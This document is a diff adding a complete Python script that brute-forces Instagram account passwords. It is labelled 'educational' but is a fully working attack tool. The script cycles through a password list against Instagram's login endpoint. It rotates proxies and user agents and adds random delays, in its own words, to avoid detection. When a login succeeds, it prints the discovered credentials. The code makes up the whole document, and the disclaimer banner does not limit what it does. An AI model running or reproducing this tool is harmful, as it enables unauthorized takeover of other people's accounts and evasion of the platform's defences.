@@ -1,0 +1,215 @@
+
+```python
+#!/usr/bin/env python3
+"""
+Instagram Brute Force Tool (Educational Purposes Only)
+Improved version with:
+- Better proxy handling
+- User agent rotation
+- Rate limiting
+- Error handling
+"""
+
+import requests
+import json
+import time
+import os
+import random
+import sys
+from urllib.parse import urlparse
+
+class Instabrute:
+    def __init__(self, username, passwords_file='pass.txt', proxy_file='proxy.txt'):
+        self.username = username
+        self.passwords_file = passwords_file
+        self.proxy_file = proxy_file
+        self.current_proxy = ''
+        self.used_proxies = []
+        self.session = requests.Session()
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36"
+        ]
+        self.delay_range = (2, 5)  # Random delay between requests
+        self.max_retries = 3
+        
+        self.validate_files()
+        self.check_username()
+        
+        if self.ask_yes_no("[*] Do you want to use proxy"):
+            self.setup_proxy()
+
+    # Helper methods
+    @staticmethod
+    def ask_yes_no(question):
+        while True:
+            answer = input(f"{question} [y/n]: ").lower()
+            if answer in ('y', 'yes'):
+                return True
+            elif answer in ('n', 'no'):
+                return False
+            print("Please enter 'y' or 'n'")
+
+    @staticmethod
+    def clear_screen():
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+    # File validation
+    def validate_files(self):
+        if not os.path.isfile(self.passwords_file):
+            print(f"[!] Password file '{self.passwords_file}' not found")
+            sys.exit(1)
+            
+        with open(self.passwords_file) as f:
+            self.passwords = [p.strip() for p in f.readlines() if p.strip()]
+            
+        if not self.passwords:
+            print("[!] No passwords found in the file")
+            sys.exit(1)
+            
+        print(f"[*] Loaded {len(self.passwords)} passwords")
+
+    # Proxy handling
+    def setup_proxy(self):
+        if not os.path.isfile(self.proxy_file):
+            print(f"[!] Proxy file '{self.proxy_file}' not found")
+            return
+            
+        with open(self.proxy_file) as f:
+            proxies = [p.strip() for p in f.readlines() if p.strip()]
+            
+        if not proxies:
+            print("[!] No proxies found in the file")
+            return
+            
+        for _ in range(self.max_retries):
+            proxy = random.choice(proxies)
+            if proxy not in self.used_proxies:
+                if self.test_proxy(proxy):
+                    self.current_proxy = proxy
+                    self.used_proxies.append(proxy)
+                    self.session.proxies = {
+                        'http': proxy,
+                        'https': proxy
+                    }
+                    return
+                    
+        print("[!] Failed to find working proxy")
+
+    def test_proxy(self, proxy):
+        try:
+            test_url = "http://ip-api.com/json"
+            response = requests.get(
+                test_url,
+                proxies={'http': proxy, 'https': proxy},
+                timeout=10
+            )
+            print(f"[*] Proxy IP: {response.json().get('query')}")
+            return True
+        except Exception as e:
+            print(f"[!] Proxy failed: {str(e)}")
+            return False
+
+    # Instagram API methods
+    def check_username(self):
+        url = f"https://www.instagram.com/{self.username}/?__a=1"
+        try:
+            response = self.session.get(url)
+            if response.status_code == 404:
+                print(f"[!] User '{self.username}' not found")
+                sys.exit(1)
+            return True
+        except Exception as e:
+            print(f"[!] Error checking username: {str(e)}")
+            sys.exit(1)
+
+    def login(self, password):
+        try:
+            # Random delay to avoid detection
+            time.sleep(random.uniform(*self.delay_range))
+            
+            # Set random user agent
+            self.session.headers.update({
+                'User-Agent': random.choice(self.user_agents),
+                'X-Instagram-AJAX': '1',
+                'X-Requested-With': 'XMLHttpRequest'
+            })
+            
+            # Get CSRF token
+            home_page = self.session.get('https://www.instagram.com/')
+            csrf_token = home_page.cookies.get('csrftoken')
+            
+            if not csrf_token:
+                print("[!] Failed to get CSRF token")
+                return False
+                
+            self.session.headers.update({'X-CSRFToken': csrf_token})
+            
+            # Attempt login
+            login_url = 'https://www.instagram.com/accounts/login/ajax/'
+            login_data = {
+                'username': self.username,
+                'password': password,
+                'queryParams': '{}'
+            }
+            
+            response = self.session.post(login_url, data=login_data)
+            response_data = response.json()
+            
+            if response_data.get('authenticated'):
+                return True
+                
+            if response_data.get('message') == 'checkpoint_required':
+                print("[!] Instagram checkpoint triggered")
+                
+            return False
+                
+        except Exception as e:
+            print(f"[!] Login error: {str(e)}")
+            return False
+
+    # Main brute force method
+    def run(self):
+        print(f"\n[*] Starting attack on: {self.username}")
+        print(f"[*] Using delay: {self.delay_range[0]}-{self.delay_range[1]} seconds")
+        print(f"[*] Current proxy: {self.current_proxy or 'None'}\n")
+        
+        for i, password in enumerate(self.passwords, 1):
+            print(f"[{i}/{len(self.passwords)}] Trying: {password}", end='\r')
+            
+            if self.login(password):
+                print(f"\n\n[+] SUCCESS! Credentials found:")
+                print(f"    Username: {self.username}")
+                print(f"    Password: {password}")
+                return True
+                
+        print("\n\n[!] Attack completed - No valid password found")
+        return False
+
+if __name__ == "__main__":
+    # Display banner
+    Instabrute.clear_screen()
+    print("\n" + "="*50)
+    print("INSTAGRAM BRUTE FORCE TOOL (EDUCATIONAL USE ONLY)")
+    print("="*50 + "\n")
+    print("Warning: Unauthorized testing is illegal!")
+    print("Only test accounts you own or have permission to test\n")
+    
+    try:
+        # Get user input
+        username = input("[*] Enter target username: ").strip()
+        pass_file = input("[*] Password file [pass.txt]: ").strip() or "pass.txt"
+        proxy_file = input("[*] Proxy file [proxy.txt]: ").strip() or "proxy.txt"
+        
+        # Initialize and run
+        brute = Instabrute(username, pass_file, proxy_file)
+        brute.run()
+        
+    except KeyboardInterrupt:
+        print("\n[!] Operation cancelled by user")
+    except Exception as e:
+        print(f"\n[!] Critical error: {str(e)}")
+    
+    input("\n[*] Press Enter to exit...")
+```
